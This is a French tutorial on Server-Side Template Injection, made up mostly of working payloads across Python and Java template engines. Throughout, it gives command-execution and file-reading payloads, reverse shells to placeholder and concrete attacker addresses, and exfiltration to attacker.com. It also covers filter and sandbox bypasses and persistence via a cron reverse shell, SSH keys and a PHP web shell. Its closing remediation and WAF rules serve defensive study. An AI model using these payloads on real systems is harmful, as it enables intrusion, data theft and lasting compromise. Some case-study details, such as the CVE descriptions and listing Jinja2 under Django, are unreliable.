# Guide d'Exploitation des SSTI (Server-Side Template Injection)

## Table des matières
1. [Introduction aux SSTI](#introduction-aux-ssti)
2. [Détection et identification](#détection-et-identification)
3. [SSTI Python](#ssti-python)
4. [SSTI Java](#ssti-java)
5. [Méthodologie générale](#méthodologie-générale)
6. [Outils et automatisation](#outils-et-automatisation)
7. [Protections et remédiation](#protections-et-remédiation)

---

## Introduction aux SSTI

### Qu'est-ce qu'une SSTI ?

Une **Server-Side Template Injection** (SSTI) est une vulnérabilité qui survient lorsqu'une application web utilise un **moteur de templates** (Jinja2, Twig, Freemarker, etc.) et permet à un attaquant d'injecter du code malveillant dans un template.

### Différence avec XSS

| Aspect | XSS (Client-Side) | SSTI (Server-Side) |
|:---|:---|:---|
| **Exécution** | Dans le navigateur de la victime | Sur le serveur |
| **Impact** | Vol de session, phishing | RCE, lecture de fichiers sensibles |
| **Gravité** | Moyenne à Haute | Critique |
| **Cible** | Utilisateurs de l'application | Le serveur lui-même |

### Moteurs de templates vulnérables

#### Python
- **Jinja2** (Flask, Django)
- **Mako**
- **Tornado**
- **Twig** (Symfony - PHP mais même principe)

#### Java
- **Freemarker** (Spring)
- **Velocity**
- **Thymeleaf**
- **Pebble**

#### Autres langages
- **ERB** (Ruby on Rails)
- **Smarty** (PHP)
- **Handlebars** (Node.js)

### Exemple de code vulnérable

#### Python (Flask + Jinja2)
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    
    # ⚠️ VULNÉRABLE : Concaténation directe dans le template
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# URL vulnérable : http://example.com/hello?name={{7*7}}
# Résultat : <h1>Hello 49!</h1>
```

#### Code sécurisé
```python
@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    
    # ✅ SÉCURISÉ : Utilisation de variables dans le template
    template = "<h1>Hello {{ name }}!</h1>"
    return render_template_string(template, name=name)

# URL : http://example.com/hello?name={{7*7}}
# Résultat : <h1>Hello {{7*7}}!</h1>  (pas d'évaluation)
```

---

## Détection et Identification

### Phase 1 : Détection de l'injection

#### Payloads de détection universels

Testez ces payloads dans tous les champs de saisie (GET, POST, headers, cookies) :

```
# Basique
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{7*7}

# Avec espaces
{{ 7*7 }}
${ 7*7 }
<%= 7 * 7 %>

# Concaténation
{{7*'7'}}
${'a'*7}
```

**Résultats attendus** :
- **Vulnérable** : La page affiche `49` ou `7777777`
- **Non vulnérable** : La page affiche littéralement `{{7*7}}`
- **WAF présent** : Erreur 403/406 ou blocage

#### Identification du moteur de template

Une fois l'injection confirmée, identifiez le moteur :

```
# Test Jinja2 (Python)
{{config}}
{{self}}
{{''.__class__}}

# Test Freemarker (Java)
${"test".toUpperCase()}
${7*7}

# Test ERB (Ruby)
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>

# Test Smarty (PHP)
{$smarty.version}
{php}echo `id`;{/php}

# Test Tornado (Python)
{{handler.settings}}

# Test Mako (Python)
<%
import os
os.system('id')
%>
```

### Phase 2 : Cartographie de l'environnement

#### Détection de la technologie

```
# Jinja2
{{config.items()}}

# Twig
{{_self}}

# Freemarker
${.version}

# Velocity
#set($x='')
$x.class.name
```

---

## SSTI Python

### Architecture de Jinja2

Jinja2 utilise un système de **contexte** et de **namespace** qui expose des objets Python.

```python
# Structure d'objet Python
objet
  └── __class__        # Classe de l'objet
       └── __mro__     # Method Resolution Order
            └── __subclasses__()  # Sous-classes disponibles
       └── __init__
            └── __globals__       # Variables globales
                 └── __builtins__ # Fonctions built-in (import, eval, etc.)
```

### Méthode 1 : Énumération des builtins

#### Étape 1 : Lister les fonctions disponibles

```python
# Payload de base
{{self.__init__.__globals__.__builtins__}}

# Avec formatage pour meilleure lisibilité
{{self.__init__.__globals__.__builtins__.keys()}}
```

**Résultat attendu** :
```
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', 
'__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 
'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'exit', 
'format', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 
'isinstance', 'issubclass', 'iter', 'len', 'license', 'locals', 'map', 'max', 
'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 
'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 
'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 
'vars', 'zip'])
```

#### Étape 2 : Vérifier la présence de `__import__`

```python
# Vérification
{{'__import__' in self.__init__.__globals__.__builtins__.keys()}}

# Si True, exploitation possible
```

#### Étape 3 : Exploitation avec `__import__`

```python
# Import du module 'os' et exécution de commandes
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Listing des fichiers
{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}

# Lecture de fichiers sensibles
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}

# Lecture du flag
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

### Méthode 2 : Via les sous-classes

#### Concept

Python expose toutes les classes héritant de `object` via `__subclasses__()`. Certaines de ces classes ont accès à des fonctions dangereuses.

#### Étape 1 : Lister les sous-classes

```python
# Obtenir toutes les sous-classes d'object
{{''.__class__.__mro__[1].__subclasses__()}}

# Avec numérotation pour faciliter la recherche
{% for i in range(0, 500) %}
  {{i}}: {{''.__class__.__mro__[1].__subclasses__()[i]}}
{% endfor %}
```

#### Étape 2 : Identifier les classes utiles

Recherchez ces classes particulièrement intéressantes :

```python
# Généralement autour de l'index 100-400
<class 'os._wrap_close'>        # Accès à os.popen
<class 'subprocess.Popen'>      # Exécution de commandes
<class 'warnings.catch_warnings'>  # Accès à __builtins__
```

#### Étape 3 : Exploitation

```python
# Exemple avec os._wrap_close (index 137 dans cet exemple)
{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['popen']('id').read()}}

# Exemple avec subprocess.Popen (index 258)
{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Exemple avec warnings.catch_warnings
{{''.__class__.__mro__[1].__subclasses__()[184]()._module.__builtins__['__import__']('os').popen('id').read()}}
```

### Méthode 3 : Via `config` (spécifique Flask)

```python
# Accès à la configuration Flask
{{config}}

# Accès aux items de configuration
{{config.items()}}

# Récupération de la SECRET_KEY
{{config['SECRET_KEY']}}

# Exploitation via config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Méthode 4 : Via `request` (Flask/Jinja2)

```python
# Accès à l'objet request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via l'environnement
{{request.environ}}

# Lecture de variables d'environnement sensibles
{{request.environ['SECRET_KEY']}}
```

### Payloads avancés

#### Reverse Shell

```python
# Reverse shell bash
{{self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'").read()}}

# Reverse shell Python
{{self.__init__.__globals__.__builtins__.__import__('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'").read()}}

# Reverse shell netcat
{{self.__init__.__globals__.__builtins__.__import__('os').popen("nc -e /bin/bash ATTACKER_IP PORT").read()}}
```

**Exemple concret** :
```python
# Attaquant : écoute sur le port 2309
nc -lvnp 2309

# Victime : payload SSTI
{{self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/82.66.107.105/2309 0>&1'").read()}}
```

#### Exfiltration de données

```python
# Via curl
{{self.__init__.__globals__.__builtins__.__import__('os').popen("curl http://attacker.com/?data=$(cat flag.txt | base64)").read()}}

# Via DNS (dns exfiltration)
{{self.__init__.__globals__.__builtins__.__import__('os').popen("nslookup $(cat flag.txt | base64).attacker.com").read()}}

# Via wget
{{self.__init__.__globals__.__builtins__.__import__('os').popen("wget http://attacker.com/$(cat flag.txt)").read()}}
```

#### Upload de fichiers

```python
# Télécharger un fichier depuis l'attaquant
{{self.__init__.__globals__.__builtins__.__import__('os').popen("wget http://attacker.com/shell.py -O /tmp/shell.py").read()}}

# Exécuter le fichier téléchargé
{{self.__init__.__globals__.__builtins__.__import__('os').popen("python3 /tmp/shell.py").read()}}
```

### Contournement de filtres

#### Filtres courants

```python
# Blocage de 'os'
# Bypass : concaténation
{{'o'+'s'}}
{{request.args.module}}  # avec ?module=os

# Blocage de '__import__'
# Bypass : via getattr
{{self.__init__.__globals__.__builtins__['__imp'+'ort__']('os')}}

# Blocage des points
# Bypass : via []
{{self['__init__']['__globals__']['__builtins__']['__import__']('os')}}

# Blocage de 'system' ou 'popen'
# Bypass : via eval
{{self.__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}

# Blocage des quotes
# Bypass : via chr() ou request.args
{{self.__init__.__globals__.__builtins__.__import__(request.args.m).popen(request.args.c).read()}}
# URL: ?m=os&c=id
```

#### Techniques de bypass avancées

```python
# Encodage base64
{{self.__init__.__globals__.__builtins__.__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dk').decode()}}

# Via attr()
{{().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

# Utilisation de lipsum (Jinja2 builtin)
{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Utilisation de cycler (Jinja2 builtin)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Utilisation de joiner (Jinja2 builtin)
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Utilisation de namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### Cas particuliers

#### Jinja2 avec mode sandbox

```python
# Le mode sandbox bloque l'accès aux attributs dangereux
# Bypass potentiel via format string
{{"%c"|format(97)}}  # Retourne 'a'

# Exploitation
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

#### Tornado templates

```python
# Tornado expose handler.settings
{{handler.settings}}

# Exploitation
{% import os %}{{os.popen('id').read()}}

# Alternative
{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
```

#### Mako templates

```python
# Syntaxe différente
<%
import os
x=os.popen('id').read()
%>
${x}

# One-liner
${ __import__('os').popen('id').read() }
```

---

## SSTI Java

### Moteurs de templates Java

#### Freemarker

**Freemarker** est le moteur de template par défaut de Spring Boot. Il est particulièrement vulnérable aux SSTI.

### Détection

#### Payloads de test

```java
// Test basique
${7*7}
{{7*7}}
#{7*7}
*{7*7}

// Test avec concaténation
${"test"}
${"a"*7}

// Test de fonctions
${"test".toUpperCase()}

// Résultat attendu si vulnérable
49
TEST
aaaaaaa
```

### Exploitation Freemarker

#### Architecture de Freemarker

Freemarker expose des classes via le **Built-in `?new()`** qui permet d'instancier des objets Java.

#### Méthode 1 : Exécution via `Execute`

```java
// Classe dangereuse : freemarker.template.utility.Execute
// Permet d'exécuter des commandes système

// Payload de base
${"freemarker.template.utility.Execute"?new()("id")}

// Lecture de fichiers
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}

// Lecture du flag
${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
${"freemarker.template.utility.Execute"?new()("cat SECRET_FLAG.txt")}

// Listing de répertoire
${"freemarker.template.utility.Execute"?new()("ls -la")}
```

#### Méthode 2 : Exécution via `ObjectConstructor`

```java
// Instanciation d'objets arbitraires
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// Avec ProcessBuilder
<#assign classloader=object?api.class.getClassLoader()>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign objConstructor=owc?newInstance()>
<#assign pb=objConstructor("java.lang.ProcessBuilder",["id"])>
${pb.start()}
```

#### Méthode 3 : Via `JythonRuntime`

```java
// Si Jython est disponible
<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
<#assign is=jython("import os; os.system('id')")>
```

#### Méthode 4 : Accès à la configuration

```java
// Accès aux paramètres de configuration
${.data_model}

// Lecture de variables d'environnement
${.data_model["env"]["SECRET_KEY"]}
```

### Exploitation avancée Freemarker

#### Reverse Shell

```java
// Reverse shell bash
${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")}

// Reverse shell Java
<#assign runtime=object?api.class.forName("java.lang.Runtime").getRuntime()>
<#assign process=runtime.exec("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")>

// Reverse shell via ProcessBuilder
<#assign pb=object?api.class.forName("java.lang.ProcessBuilder")>
<#assign arrayList=object?api.class.forName("java.util.ArrayList")?new()>
<#assign void=arrayList.add("/bin/bash")>
<#assign void=arrayList.add("-c")>
<#assign void=arrayList.add("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1")>
<#assign process=pb?new(arrayList).start()>
```

#### Lecture de fichiers sensibles

```java
// Via Execute
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
${"freemarker.template.utility.Execute"?new()("cat /home/user/.ssh/id_rsa")}

// Via FileReader
<#assign file=object?api.class.forName("java.io.File")?new("/etc/passwd")>
<#assign scanner=object?api.class.forName("java.util.Scanner")?new(file)>
<#list 1..100 as i>
  <#if scanner.hasNextLine()>
    ${scanner.nextLine()}
  </#if>
</#list>
```

#### Écriture de fichiers

```java
// Écriture via FileWriter
<#assign fileWriter=object?api.class.forName("java.io.FileWriter")?new("/tmp/shell.sh")>
<#assign void=fileWriter.write("#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1")>
<#assign void=fileWriter.close()>

// Exécution du fichier créé
${"freemarker.template.utility.Execute"?new()("chmod +x /tmp/shell.sh && /tmp/shell.sh")}
```

### Autres moteurs Java

#### Velocity

```java
// Test de détection
#set($x='')
$x.class.name

// Exploitation
#set($runtime = $x.class.forName('java.lang.Runtime'))
#set($process = $runtime.getRuntime().exec('id'))
#set($input = $process.getInputStream())
#set($scanner = $x.class.forName('java.util.Scanner'))
#set($constructor = $scanner.getDeclaredConstructor($x.class.forName('java.io.InputStream')))
#set($sc = $constructor.newInstance($input).useDelimiter('\A'))
$sc.next()
```

#### Thymeleaf

```java
// Test de détection
[[${7*7}]]
[(${7*7})]

// Exploitation (Thymeleaf 3.0+)
// Via SpringEL
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]

// Lecture de fichiers
[[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}]]
```

#### Pebble

```java
// Test de détection
{{ 7*7 }}

// Exploitation
{% set cmd = 'id' %}
{{ beans.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) }}
```

### Contournement de filtres (Java)

```java
// Blocage de 'Execute'
// Bypass : concaténation
${"freemarker.template.utility."+"Execute"?new()("id")}

// Blocage de certaines commandes
// Bypass : encodage base64
${"freemarker.template.utility.Execute"?new()("echo aWQ= | base64 -d | bash")}

// Blocage de 'freemarker'
// Bypass : via reflection
<#assign classLoader=object?api.class.getClassLoader()>
<#assign clazz=classLoader.loadClass("freemarker.template.utility.Execute")>
<#assign obj=clazz?new()>
${obj("id")}

// Utilisation de variables
<#assign cmd="id">
${"freemarker.template.utility.Execute"?new()(cmd)}
```

---

## Méthodologie Générale

### 1. Reconnaissance

#### Identification du point d'injection

Testez **tous** les points d'entrée :
- Paramètres GET/POST
- Headers HTTP (User-Agent, Referer, X-Forwarded-For)
- Cookies
- Champs de formulaires
- JSON/XML input
- File upload (nom de fichier, métadonnées)

#### Payloads de détection

```python
# Script de test automatique
payloads = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${7*'7'}",
]

for payload in payloads:
    response = send_request(payload)
    if "49" in response or "7777777" in response:
        print(f"[+] Vulnérable avec : {payload}")
```

### 2. Identification du moteur

#### Décision Tree

```
Injection détectée
    |
    ├─ Python ?
    │   ├─ {{config}} fonctionne → Flask + Jinja2
    │   ├─ {{handler}} fonctionne → Tornado
    │   └─ <% %> fonctionne → Mako
    │
    ├─ Java ?
    │   ├─ ${"test".toUpperCase()} → Freemarker
    │   ├─ #set($x='') → Velocity
    │   └─ [[${7*7}]] → Thymeleaf
    │
    ├─ Ruby ?
    │   └─ <%= 7*7 %> → ERB
    │
    └─ PHP ?
        └─ {$smarty.version} → Smarty
```

### 3. Exploitation

#### Checklist progressive

```
☐ 1. Détection de l'injection (7*7 = 49)
☐ 2. Identification du moteur
☐ 3. Test de lecture de fichiers (cat /etc/passwd)
☐ 4. Énumération de l'environnement (env, pwd, whoami)
☐ 5. Localisation du flag (find / -name flag*)
☐ 6. Lecture du flag
☐ 7. (Optionnel) Établissement d'un reverse shell
```

#### Commandes de reconnaissance

```bash
# Informations système
id
whoami
uname -a
cat /etc/os-release

# Énumération réseau
ifconfig
ip a
netstat -tuln

# Processus et services
ps aux
systemctl list-units

# Recherche de fichiers sensibles
find / -name flag* 2>/dev/null
find / -name secret* 2>/dev/null
find / -perm -4000 2>/dev/null  # SUID

# Variables d'environnement
env
printenv

# Historique
cat ~/.bash_history
cat ~/.zsh_history
```

### 4. Post-exploitation

#### Stabilisation du shell

```bash
# Python TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset

# Script TTY
script /dev/null -c bash

# Socat
socat file:`tty`,raw,echo=0 tcp-listen:PORT
```

#### Persistence

```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" | crontab -

# SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Backdoor web
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
```

---

## Outils et Automatisation

### TPLMap

**TPLMap** est l'outil de référence pour détecter et exploiter les SSTI.

#### Installation

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip3 install -r requirements.txt
```

#### Utilisation

```bash
# Détection automatique
python3 tplmap.py -u 'http://target.com/page?name=test'

# Exploitation avec shell interactif
python3 tplmap.py -u 'http://target.com/page?name=test' --os-shell

# Lecture de fichiers
python3 tplmap.py -u 'http://target.com/page?name=test' --file-read /etc/passwd

# Upload de fichiers
python3 tplmap.py -u 'http://target.com/page?name=test' --file-upload shell.py --file-dest /tmp/shell.py

# Via POST
python3 tplmap.py -u 'http://target.com/page' -d 'name=test&email=test@test.com'

# Avec cookies
python3 tplmap.py -u 'http://target.com/page?name=test' -c 'PHPSESSID=abc123'

# Force un moteur spécifique
python3 tplmap.py -u 'http://target.com/page?name=test' --engine Jinja2
```

### SSTImap

Alternative à TPLMap avec support de plus de moteurs.

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip3 install -r requirements.txt

# Utilisation
python3 sstimap.py -u 'http://target.com/page?name=test'
```

### Scripts personnalisés

#### Détection automatique (Python)

```python
#!/usr/bin/env python3
import requests

target = "http://target.com/page"
payloads = {
    "Jinja2": "{{7*7}}",
    "Freemarker": "${7*7}",
    "ERB": "<%= 7*7 %>",
    "Smarty": "{7*7}",
    "Velocity": "#set($x=7*7)$x",
}

for engine, payload in payloads.items():
    r = requests.get(target, params={"name": payload})
    if "49" in r.text:
        print(f"[+] Vulnérable à {engine}")
        print(f"    Payload : {payload}")
```

#### Exploitation Jinja2 (Python)

```python
#!/usr/bin/env python3
import requests

target = "http://target.com/page"

# Payload RCE
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}"

r = requests.get(target, params={"name": payload})
print(r.text)
```

#### Exploitation Freemarker (Python)

```python
#!/usr/bin/env python3
import requests

target = "http://target.com/page"

# Payload RCE
payload = '${"freemarker.template.utility.Execute"?new()("cat flag.txt")}'

r = requests.post(target, data={"template": payload})
print(r.text)
```

---

## Protections et Remédiation

### Développeurs

#### 1. Ne jamais concaténer l'input utilisateur dans les templates

```python
# ❌ MAUVAIS
template = f"<h1>Hello {user_input}!</h1>"
return render_template_string(template)

# ✅ BON
template = "<h1>Hello {{ name }}!</h1>"
return render_template_string(template, name=user_input)
```

#### 2. Utiliser le mode sandbox

```python
# Jinja2 avec sandbox
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
output = template.render(name=user_input)
```

#### 3. Valider et sanitiser l'input

```python
import re

def sanitize_input(user_input):
    # Whitelist : uniquement alphanumérique
    if not re.match(r'^[a-zA-Z0-9]+$', user_input):
        raise ValueError("Input invalide")
    return user_input

name = sanitize_input(request.args.get('name'))
```

#### 4. Utiliser des templates statiques

```python
# ❌ Templates dynamiques
render_template_string(user_template)

# ✅ Templates statiques
render_template('template.html', name=user_input)
```

#### 5. Désactiver les fonctionnalités dangereuses

```python
# Freemarker : désactiver Execute
configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);

# Jinja2 : limiter les attributs accessibles
env.globals.clear()
env.filters.clear()
```

### Pentesters / Bug Hunters

#### Checklist de test

```
☐ Tester tous les points d'entrée (GET, POST, headers, cookies)
☐ Tester avec différents payloads (Jinja2, Freemarker, ERB, etc.)
☐ Vérifier les réponses pour détection (49, erreurs, etc.)
☐ Identifier le moteur de template
☐ Tester l'exécution de code
☐ Documenter avec PoC
☐ Suggérer des remediations
```

#### Rapport de vulnérabilité

```markdown
# Server-Side Template Injection - CRITICAL

## Description
L'application est vulnérable à une injection de template côté serveur (SSTI) 
via le paramètre `name` de la page `/hello`.

## Impact
- Exécution de code arbitraire sur le serveur (RCE)
- Lecture de fichiers sensibles
- Compromission totale du serveur

## Preuve de concept
```http
GET /hello?name={{7*7}} HTTP/1.1
Host: target.com

Réponse : Hello 49!
```

## Steps to reproduce
1. Naviguer vers http://target.com/hello?name=test
2. Injecter le payload : {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
3. Observer l'exécution de la commande `id`

## Remediation
1. Ne jamais concaténer l'input utilisateur dans les templates
2. Utiliser des templates statiques avec variables
3. Activer le mode sandbox de Jinja2
4. Valider et sanitiser tous les inputs
```

### WAF / Défense

#### Règles de détection

```
# ModSecurity / WAF rules
SecRule ARGS "@rx (?:\{\{|\$\{|<%=|#\{|\*\{)" \
    "id:1000,phase:2,deny,status:403,msg:'SSTI Attempt'"

# Détection de patterns dangereux
SecRule ARGS "@rx (?:__import__|eval|exec|compile|popen|subprocess)" \
    "id:1001,phase:2,deny,status:403,msg:'Dangerous function call'"

# Détection de classes Python dangereuses
SecRule ARGS "@rx (?:__class__|__mro__|__subclasses__|__globals__|__builtins__)" \
    "id:1002,phase:2,deny,status:403,msg:'Python object introspection'"
```

#### Monitoring et alertes

```python
# Exemple de logging des tentatives
import logging

def detect_ssti(user_input):
    dangerous_patterns = [
        '{{', '${', '<%=', '#{',
        '__import__', '__class__', '__globals__',
        'eval', 'exec', 'compile'
    ]
    
    for pattern in dangerous_patterns:
        if pattern in user_input:
            logging.warning(f"SSTI attempt detected: {user_input}")
            return True
    
    return False
```

---

## Ressources Complémentaires

### Documentation

- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### Outils

- [TPLMap](https://github.com/epinna/tplmap) - Exploitation automatique
- [SSTImap](https://github.com/vladko312/SSTImap) - Alternative à TPLMap
- [Burp Suite](https://portswigger.net/burp) - Avec extension SSTI

### Challenges pratiques

- [PortSwigger Web Security Academy - SSTI Labs](https://portswigger.net/web-security/all-labs#server-side-template-injection)
- [HackTheBox](https://www.hackthebox.com/) - Machines avec SSTI
- [Root-Me](https://www.root-me.org/) - Challenges SSTI
- [PentesterLab](https://pentesterlab.com/) - Exercices SSTI

### Payloads repositories

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)

---

## Cas d'études réels

### CVE-2019-19844 (Django)

Vulnérabilité SSTI dans la fonction de reset de mot de passe de Django.

```python
# Payload
email={{request.user.is_staff}}@example.com

# Exploitation
email={{request.user.password}}@example.com
```

### CVE-2020-10199 (Nexus Repository Manager)

SSTI dans Nexus Repository Manager via le moteur Velocity.

```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

### Uber - Bug Bounty (2016)

SSTI trouvée dans un service interne d'Uber utilisant Jinja2.

```python
{{config.items()}}
# Leak de SECRET_KEY et credentials
```

**Reward** : $10,000

---

## Conclusion

Les **Server-Side Template Injection** sont des vulnérabilités **critiques** qui peuvent mener à :
- Exécution de code à distance (RCE)
- Lecture de fichiers sensibles
- Compromission totale du serveur

### Points clés à retenir

✅ **Toujours tester** tous les points d'entrée
✅ **Identifier** le moteur de template utilisé
✅ **Exploiter** avec les payloads appropriés
✅ **Documenter** les vulnérabilités trouvées
✅ **Corriger** en utilisant des templates statiques et le mode sandbox

### Prochaines étapes d'apprentissage

1. **Expression Language Injection** (EL Injection)
2. **Client-Side Template Injection** (CSTI)
3. **Server-Side Includes** (SSI Injection)
4. **XML External Entity** (XXE)
5. **Deserialization attacks**

---

*Document créé pour l'apprentissage de la sécurité applicative - Usage strictement éducatif et légal*
